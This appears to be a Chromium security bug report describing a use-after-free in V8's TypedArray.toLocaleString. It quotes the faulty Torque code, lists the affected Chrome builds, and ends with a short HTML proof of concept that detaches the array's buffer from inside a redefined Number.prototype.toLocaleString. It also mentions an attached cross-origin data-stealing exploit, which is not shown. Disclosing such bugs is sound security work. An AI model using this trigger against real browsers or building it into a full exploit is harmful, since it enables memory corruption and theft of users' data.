<b>VULNERABILITY DETAILS</b>
TypedArray |join|, |toString|, and |toLocaleString| have been recently ported to Torque. The check whether it is safe to use the fast accessor for TypedArray elements is as follows:

src/v8/src/builtins/array-join.tq:109:
CannotUseSameArrayAccessor<JSTypedArray>(implicit context: Context)(
  loadFn: LoadJoinElementFn, receiver: JSReceiver, initialMap: Map,
  initialLen: Number): never
  labels Cannot, Can {
// It is assumed that neither loading a typed array element nor converting a
// number to string have side-effects. As such, it safe to use the initial
// LoadJoinElement specialization and it cannot change through out the join
// call.
assert(!IsDetachedBuffer(UnsafeCast<JSTypedArray>(receiver).buffer));
goto Can;
}

While this comment is correct for |join| and |toString|, |TypedArray.toLocaleString| does have side-effects since it calls |Number.toLocaleString|, which could be redefined by a user.
The redefined method might detach the typed array's backing store, leading to a use-after-free condition.

<b>VERSION</b>
Google Chrome	73.0.3642.0 (Official Build) canary (32-bit) (cohort: Clang-32)
Google Chrome	73.0.3639.1 (Official Build) dev (64-bit) (cohort: Dev)

<b>REPRODUCTION CASE</b>
<script>
array = new Int8Array(1024 * 1024);
Number.prototype.toLocaleString = function() {
  try {
    postMessage("", "", [array.buffer]);
  } catch { }
}
array.toLocaleString();
</script>

The usual TypedArray PoC that steals cross-origin image data is also attached.
